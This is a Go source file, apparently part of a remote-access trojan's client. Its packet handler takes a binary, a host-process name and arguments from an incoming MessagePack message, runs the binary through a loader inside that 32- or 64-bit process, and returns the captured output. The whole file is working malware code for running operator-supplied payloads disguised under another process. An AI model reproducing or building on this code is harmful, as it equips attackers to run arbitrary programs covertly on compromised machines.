package HandlePacket

import (
	"main/Helper/loader"
	"main/MessagePack"
	"runtime"
)

func pluginCmd(unmsgpack MessagePack.MsgPack) string {
	var prog string
	if runtime.GOARCH == "amd64" {
		prog = unmsgpack.ForcePathObject("Process64").GetAsString()
	} else {
		prog = unmsgpack.ForcePathObject("Process86").GetAsString()
	}
	//fmt.Println(unmsgpack.ForcePathObject("args").GetAsString())
	stdOut, stdErr := loader.RunCreateProcessWithPipe(unmsgpack.ForcePathObject("Bin").GetAsBytes(), prog, unmsgpack.ForcePathObject("args").GetAsString())
	if stdOut == "" {
		return stdErr
	}
	return stdOut
}
